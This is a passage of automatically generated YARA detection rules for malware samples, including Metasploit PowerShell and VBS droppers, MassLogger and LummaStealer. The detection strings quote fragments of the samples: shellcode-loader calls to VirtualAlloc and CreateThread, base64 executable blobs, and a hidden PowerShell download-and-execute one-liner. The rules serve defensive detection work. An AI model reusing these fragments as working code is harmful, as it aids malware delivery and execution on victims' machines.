      $s11 = "b7uyiFeqDBb2bx5nIIH0If4dSsWS2+cOp4ZVAA9jl6cz9MWlogWDYAu6edRzBOrhPSKcvEZWLD8sDZBqw0Ze1kbssdlY3FnE3KsAlAGgHDspyVmraozYDTdz3BIK7dhe" ascii /* score: '21.00'*/
      $s12 = "XN4UFtKbWiFO0xTwsNar7o/IPMwPN7pKWbiKWYxvlYP1B2x0lOgk0WDwrFe1xa/utcbn1+L3O7/QeNVXTXh4BqsPztGre7fB/1OsEYEN8JDfBCSgqsWzAz3uVEusS5hy" ascii /* score: '21.00'*/
      $s13 = "EHM2BBoV5P0cCnG20D60M1CwRUb3qzpQwQT3Gaios5qpUX0psuaV7dJEc+PNipNZDSpy/57Oqmeq5Bz0UZEYclhBSsQH1N9okFgOg3qJ0DZxC0WWgCQ92xwWNASF5s9B" ascii /* score: '21.00'*/
      $s14 = "a4izXeYe05AL+jDD7tbvbVnuH4y5V9znQijcqsG8HT/ykUpUPxWlu647bxgEUxxTXOnTRo71OhOvzB+9QiTOT9jw0VmMlzJASGPigeTE3u8IjU3b6Nqs/Vs2qHL56HmF" ascii /* score: '21.00'*/
      $s15 = "6WoFwjGg0EjI89Nm6N0dLLxkbSgGF3huEdZmiHOStOAoNjTgs86Obpy0fLzb/+IuMB++vGJMA9Xxl6xfOkvZOj7vPraoPHzx2gKLUZa7khXwOFRT0/iB2DZe8xgeLzBU" ascii /* score: '21.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 13000KB and
      1 of ($x*) and 4 of them
}

rule Metasploit_signature__c60ca2aa {
   meta:
      description = "_subset_batch - file Metasploit(signature)_c60ca2aa.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c60ca2aa3fba7534241a4d08e196e335898be230328f6fcdd6f340193318979d"
   strings:
      $x1 = "if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((f2 kernel32.dll VirtualProtect), (gBc @([IntPtr], " ascii /* score: '31.00'*/
      $s2 = "if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((f2 kernel32.dll VirtualProtect), (gBc @([IntPtr], " ascii /* score: '27.00'*/
      $s3 = "$uv1 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((f2 kernel32.dll VirtualAlloc), (gBc @([IntPtr], " ascii /* score: '27.00'*/
      $s4 = "$uv1 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((f2 kernel32.dll VirtualAlloc), (gBc @([IntPtr], " ascii /* score: '27.00'*/
      $s5 = "quals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')" fullword ascii /* score: '24.00'*/
      $s6 = "    $emei1 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((f2 kernel32.dll CreateThread), (gBc @([Int" ascii /* score: '22.00'*/
      $s7 = "    $emei1 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((f2 kernel32.dll CreateThread), (gBc @([Int" ascii /* score: '22.00'*/
      $s8 = "    $ue = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1]" ascii /* score: '19.00'*/
      $s9 = "        \"$([datetime]::Now) - $msg\" | Out-File -Append -FilePath \"$env:ProgramData\\lt_debug.log\" -Encoding utf8" fullword ascii /* score: '19.00'*/
      $s10 = "tem.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($ue.GetMethod('" ascii /* score: '18.00'*/
      $s11 = "        Log \"Failed to create thread - exiting\"" fullword ascii /* score: '18.00'*/
      $s12 = "    Log \"Failed to protect memory - exiting\"" fullword ascii /* score: '15.00'*/
      $s13 = "        Log \"Payload started successfully.\"" fullword ascii /* score: '13.00'*/
      $s14 = "1BAcHi7VJIi1IgQVGLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGFBEi0AgSQHQ41ZNMclI/8lBizSISAHWSDHArEHByQ1BAcE44HXxTANMJAhFOdF12F" ascii /* score: '11.00'*/
      $s15 = "MAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfS" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__35789622 {
   meta:
      description = "_subset_batch - file MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_35789622.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "35789622f4b1e9cb6638acba0fa26ca51e517f34bbac5dc876e3587392dcb6bb"
   strings:
      $s1 = "qLuR.exe" fullword wide /* score: '22.00'*/
      $s2 = "{0}. {1} - {2} pts ({3} attempts) [{4}] - {5}" fullword wide /* score: '19.00'*/
      $s3 = "targetNumber" fullword ascii /* score: '14.00'*/
      $s4 = "GetTargetNumber" fullword ascii /* score: '14.00'*/
      $s5 = "qLuR.pdb" fullword ascii /* score: '14.00'*/
      $s6 = "scores.txt" fullword wide /* score: '14.00'*/
      $s7 = "ZcOM.WOX" fullword ascii /* score: '13.00'*/
      $s8 = "* R%.EXV" fullword ascii /* score: '12.00'*/
      $s9 = "lblAttempts" fullword wide /* score: '11.00'*/
      $s10 = "<Attempts>k__BackingField" fullword ascii /* score: '11.00'*/
      $s11 = "Attempts: {0}" fullword wide /* score: '11.00'*/
      $s12 = "Congratulations! You guessed it in {0} attempts!" fullword wide /* score: '11.00'*/
      $s13 = "Attempts:" fullword wide /* score: '11.00'*/
      $s14 = "<GetHighScores>b__4_2" fullword ascii /* score: '9.00'*/
      $s15 = "<GetHighScores>b__1" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__12fbc26c {
   meta:
      description = "_subset_batch - file MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_12fbc26c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "12fbc26c6aebd4063ef91b729e36903eef1ff8a5b3a930ecfc501311d103295f"
   strings:
      $s1 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '24.00'*/
      $s2 = "wse.exe" fullword wide /* score: '19.00'*/
      $s3 = "SELECT * FROM tbl_users WHERE username= '" fullword wide /* score: '16.00'*/
      $s4 = "Login_And_Register_Form.frmLogin.resources" fullword ascii /* score: '15.00'*/
      $s5 = "Login_And_Register_Form.registerForm.resources" fullword ascii /* score: '15.00'*/
      $s6 = "Login_And_Register_Form.Properties.Resources.resources" fullword ascii /* score: '15.00'*/
      $s7 = "Login_And_Register_Form.Properties" fullword ascii /* score: '15.00'*/
      $s8 = "frmLogin" fullword wide /* score: '15.00'*/
      $s9 = "Login_And_Register_Form" fullword wide /* score: '15.00'*/
      $s10 = "Back to LOGIN" fullword wide /* score: '15.00'*/
      $s11 = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=db_users.mdb" fullword wide /* score: '15.00'*/
      $s12 = "Login_And_Register_Form.Properties.Resources" fullword wide /* score: '15.00'*/
      $s13 = "chckbxPassword_CheckedChanged" fullword ascii /* score: '12.00'*/
      $s14 = "chckbxPassword" fullword wide /* score: '12.00'*/
      $s15 = "Username and Password fields are empty" fullword wide /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule Metasploit_signature_ {
   meta:
      description = "_subset_batch - file Metasploit(signature).vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c631481da8dd93a3806614d1de47529114352a6d8175a53ed2f1b6635325d91f"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '26.50'*/
      $s2 = "bAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '25.00'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string */ /* score: '22.00'*/
      $s4 = "vWezmQGLIaU = \"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBw" ascii /* score: '18.00'*/
      $s5 = "AAAAAAAAAAAAAF" ascii /* base64 encoded string '          ' */ /* score: '16.50'*/
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                          ' */ /* score: '16.50'*/
      $s7 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string */ /* score: '16.50'*/
      $s8 = "AAAAAAAAAAD" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s9 = "AAAAAAAAAB" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s10 = "AAAAADAAAE" ascii /* base64 encoded string */ /* score: '16.50'*/
      $s11 = "QT4IYLI8bx9cwiXVsjFfmJlz4sSEBQjMbM6hRrbqBsewm1mXRLuEEsik7ZIZrB7q6Ltpgz8Y8QKtP+2NjSt8JE9WhRp1yXZmBxa8SdthUd7xGJEYEfallRXoMGgtw4sJ" ascii /* score: '16.00'*/
      $s12 = "klChtKEoKi = LmRdqcEsWFjlAe & \"\\\" & qoBVSUtMWQHPs.GetTempName()" fullword ascii /* score: '16.00'*/
      $s13 = "/gp1NxtvKgB83LZv3TIxCwybY08geEI5SlrHdNTf/HYgVEkCzBMJ1JTNpeyFXafw4oP9L6oh+oQTyHWyvX0c1635TYnKZt7GHHkeY89xIEGjNXmrmONkKTkctrRyi/Q8" ascii /* score: '14.00'*/
      $s14 = "nJmAZPyEXtlWc.run jIvfbXsKq, 0, true" fullword ascii /* score: '13.00'*/
      $s15 = "AAAAAAAAAAAAAAAAAACAA" ascii /* base64 encoded string */ /* score: '12.50'*/
   condition:
      uint16(0) == 0x7546 and filesize < 20KB and
      8 of them
}

rule Metasploit_signature__30c1a448 {
   meta:
      description = "_subset_batch - file Metasploit(signature)_30c1a448.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "30c1a44847a988679b9d31ee9a5a05dcaba0191571bc7054569cfac2c351a8db"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '26.50'*/
      $s2 = "bAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '24.00'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string */ /* score: '22.00'*/
      $s4 = "IUIvmBKujImrNso = \"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhp" ascii /* score: '22.00'*/
      $s5 = "jFDFQNDFYPD7/kboS+V69LvZogt3wLZ8uMjVvIbtAl6/oUbGIu0q2rZNEc+yc8ll/54g8ExeCXOnbonst/uh4sQ48bM54kngHwjqK7A+MlgT0CyBY8WNkoOSebZSEkGD" ascii /* score: '19.00'*/
      $s6 = "AAAAAAAAAAAAAF" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s7 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s8 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string */ /* score: '16.50'*/
      $s9 = "AAAAAAAAAAD" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s10 = "AAAAAAAAAB" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s11 = "AAAAADAAAE" ascii /* base64 encoded string */ /* score: '16.50'*/
      $s12 = "GvVMhFfogp = GmlTnbBa & \"\\\" & ohdnwWhTb.GetTempName()" fullword ascii /* score: '16.00'*/
      $s13 = "BgMw84Oz14IIfS+oylLbVZ4Mt/jE+u7Fy6IgANQIujpAG00ZIRCVjTSz1X2aihtfZMDDKRSvup9Y9QPdFUkH4KP2eh1dSHdC3aO8wf1k0tOv8dIcK8F7Vkn5Y4dlmGzb" ascii /* score: '16.00'*/
      $s14 = "NSdxjYp6BVpeyRpdcC0ONdgX0NLc0pp2f6tNa0z0x+UZf/2jQdqa4Lw1AnxcrDTJOxShzlCyb2S2ZgawkoPLzms89s1He7pxTEzO3ezZu5TOyaU+FHmCggJ2oyHwNjuJ" ascii /* score: '15.00'*/
      $s15 = "r34j6qdfziYermxwMg5BxMyqkqN12PXO4h9X3bYUHVklRUNOHRLH2QysuRb60vZjcfEgELxv8E/LN5tAv2AAGIE3q6ORmphwWZQ46xhB0VPgb1vCDuM5cfNP/qlRzsjF" ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x7546 and filesize < 20KB and
      8 of them
}

rule Metasploit_signature__64601f60 {
   meta:
      description = "_subset_batch - file Metasploit(signature)_64601f60.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "64601f60843f6aec285023493ee85a90e5914604e716ba3d607e4a2a90c29a08"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '26.50'*/
      $s2 = "bAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '24.00'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string */ /* score: '22.00'*/
      $s4 = "AAAAAAAAAAAAAF" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string */ /* score: '16.50'*/
      $s7 = "AAAAAAAAAAD" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s8 = "AAAAAAAAAB" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s9 = "AAAAADAAAE" ascii /* base64 encoded string */ /* score: '16.50'*/
      $s10 = "xVKK7oX+borttINgWgeTqQbPOdage/GlwzeHOCuczx2zgHXWSbVE4h3FTTuIWxj8RvdOGSnsu0QyyoS4fuGEuH7CUrYrjgINzmOgxfTQVXrDi/kbiH7fDCNN9LzbAWQg" ascii /* score: '16.00'*/
      $s11 = "tVBeUAlSRELG = jiYEOOYrHMtzQ & \"\\\" & xlqtkSBlEJi.GetTempName()" fullword ascii /* score: '16.00'*/
      $s12 = "qMQWrzIZRrZ.run lhSbiGZHbDiH, 0, true" fullword ascii /* score: '13.00'*/
      $s13 = "AAAAAAAAAAAAAAAAAACAA" ascii /* base64 encoded string*/ /* score: '12.50'*/
      $s14 = "Set qMQWrzIZRrZ = CreateObject(\"Wscript.Shell\")" fullword ascii /* score: '12.00'*/
      $s15 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACwwAAAAAAAAAAAAAFQwAAA4MAAAA" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x7546 and filesize < 20KB and
      8 of them
}

rule Metasploit_signature__b7124c8d {
   meta:
      description = "_subset_batch - file Metasploit(signature)_b7124c8d.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b7124c8d6d295cf1e7bb013c96179c45044ada35cf64be76b08a954425e6a5de"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '26.50'*/
      $s2 = "bAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '24.00'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '22.00'*/
      $s4 = "8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s5 = "AAAAAAAAAAAAAF" ascii /* base64 encoded string */ /* score: '16.50'*/
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s7 = "AAAAAAAAAAD" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s8 = "AAAAAAAAAB" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s9 = "AAAAADAAAE" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s10 = "BsEhQdwxmPmC = gzctbyQosy & \"\\\" & aqtKsFFOhYON.GetTempName()" fullword ascii /* score: '16.00'*/
      $s11 = "F5H1ue767jAxThtI7lz3flWuAcRUnwvWQoQLuNOZTjrlXZ49fWHrQhU0cd8UtcOZaA7nn04uyFFM4V8hTJlHejkXfxycgOXKqyWUzT0uVpaLgLIFzJicn6TQkwxbGQKQ" ascii /* score: '14.00'*/
      $s12 = "YYw1+XWCmIORT7kNyvYjXgUNmZzk/L9irN3+SYkcD63bAveOS/fYOz3BhUu4vPj4+VvEcfGxcDWE3JghkEYgXRYkx1TmmdRKGnfmEyLiHSL2CtgTWdH4qSxSZEMYyabf" ascii /* score: '14.00'*/
      $s13 = "KtZwQDufTiELP.run FPyYzbMRmHdVFED, 0, true" fullword ascii /* score: '13.00'*/
      $s14 = "AAAAAAAAAAAAAAAAAACAA" ascii /* base64 encoded string */ /* score: '12.50'*/
      $s15 = "Set KtZwQDufTiELP = CreateObject(\"Wscript.Shell\")" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x7546 and filesize < 20KB and
      8 of them
}

rule Metasploit_signature__d8bb8c4e {
   meta:
      description = "_subset_batch - file Metasploit(signature)_d8bb8c4e.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d8bb8c4e2bd050f63c21d4ec02c00804876b0c1679acdfd4f5f0694fb3f4509e"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '26.50'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string*/ /* score: '22.00'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACwwAAAAAAAAAAAAAFQwAAA4MAAAAAA" ascii /* base64 encoded string */ /* score: '21.00'*/
      $s4 = "AAAAAAAAAAAAAF" ascii /* base64 encoded string*/ /* score: '16.50'*/
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s7 = "AAAAAAAAAAD" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s8 = "AAAAAAAAAB" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s9 = "AAAAADAAAE" ascii /* base64 encoded string */ /* score: '16.50'*/
      $s10 = "VO260GVF24WEJs1aylE5cR1FBjjdFduF3gkKb3FtamRBa4RsQiwiUzEyElNZmMvZ1beqaGeA2gBALokpFnRYTGrlRiWIa7629hAjzs5PpsrdheF1qPxBy1xVdsKvkGR6" ascii /* score: '16.00'*/
      $s11 = "PSesfBWL = CxKIPtbGDRraJqD & \"\\\" & nNjwWVVgboJo.GetTempName()" fullword ascii /* score: '16.00'*/
      $s12 = "ptxOhSSGc.run AcEVukhKFLJDHNk, 0, true" fullword ascii /* score: '13.00'*/
      $s13 = "AAAAAAAAAAAAAAAAAACAA" ascii /* base64 encoded string*/ /* score: '12.50'*/
      $s14 = "Set ptxOhSSGc = CreateObject(\"Wscript.Shell\")" fullword ascii /* score: '12.00'*/
      $s15 = "iC69L9+vR9CoOz0cxSrRKxX+usAS4yiJbOF2niIgxke2s4aJDhOfi1UyQFz+4JP2OS8KcTCLazxWsKOwdY/QVoDGe3jepGVQFNOLIIeK13dIDwwTUA/3TIFrIkDN8qiu" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x7546 and filesize < 20KB and
      8 of them
}

rule Metasploit_signature__da9a88ec {
   meta:
      description = "_subset_batch - file Metasploit(signature)_da9a88ec.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "da9a88ecb9765e86f41dc8dfe0e12cf753b6dd1eb8783a10372e07d165c94ff7"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '26.50'*/
      $s2 = "bAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '24.00'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '22.00'*/
      $s4 = "AAAAAAAAAAAAAF" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s7 = "AAAAAAAAAAD" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s8 = "AAAAAAAAAB" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s9 = "AAAAADAAAE" ascii /* base64 encoded string */ /* score: '16.50'*/
      $s10 = "iOZefWJfWz = WfrSPeDiW & \"\\\" & xeXrPBht.GetTempName()" fullword ascii /* score: '16.00'*/
      $s11 = "Fiif+XvbA4D19/SF1jZnGFjiXqj0sDJUeM+E9laftKXCOMSiXieNMdfseTk39Nu/JRQL5yCtT2DGD+FaRWDuMJLzXlSmx3KqWpD84pl+d6vKIXsGgqyO/xEXTctJFpNm" ascii /* score: '14.00'*/
      $s12 = "UVCjyWYQcmVg.run hwTHbsLLSM, 0, true" fullword ascii /* score: '13.00'*/
      $s13 = "IdsjSwjnTTLRrGR = \"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhp" ascii /* score: '13.00'*/
      $s14 = "AAAAAAAAAAAAAAAAAACAA" ascii /* base64 encoded string*/ /* score: '12.50'*/
      $s15 = "Set UVCjyWYQcmVg = CreateObject(\"Wscript.Shell\")" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x7546 and filesize < 20KB and
      8 of them
}

rule LummaStealer_signature__3 {
   meta:
      description = "_subset_batch - file LummaStealer(signature).ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0c5cbcf4d7ffcdabdfa86d465a2c18a54ed825f0ee6d2f96a92578e69e792583"
   strings:
      $x1 = "powershell -w hidden -ep bypass -c \"do{try{$w=(New-Object Net.WebClient);$w.Headers.Add('X-PS','dvnay4');iex($w.DownloadString(" ascii /* score: '36.00'*/
      $x2 = "powershell -w hidden -ep bypass -c \"do{try{$w=(New-Object Net.WebClient);$w.Headers.Add('X-PS','dvnay4');iex($w.DownloadString(" ascii /* score: '35.00'*/
   condition:
      uint16(0) == 0x6f70 and filesize < 1KB and
      1 of ($x*)
}

rule LummaStealer_signature__8d6a06a9946b41554b4eabd6890d8c46_imphash__323aa604 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_8d6a06a9946b41554b4eabd6890d8c46(imphash)_323aa604.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "323aa6046808ffc466ee6c0a13aaabcdea1f9b16254de18b62d0cd9ff15be330"
   strings:
      $s1 = ".Qcq:\\t)" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule LummaStealer_signature__8d6a06a9946b41554b4eabd6890d8c46_imphash__52248980 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_8d6a06a9946b41554b4eabd6890d8c46(imphash)_52248980.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "52248980068109e55eb8cfef6fe163700be8b6b1f2bf14df5d10152a3e814119"
   strings:
      $s1 = ".Qcq:\\t)" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash_ {
   meta:
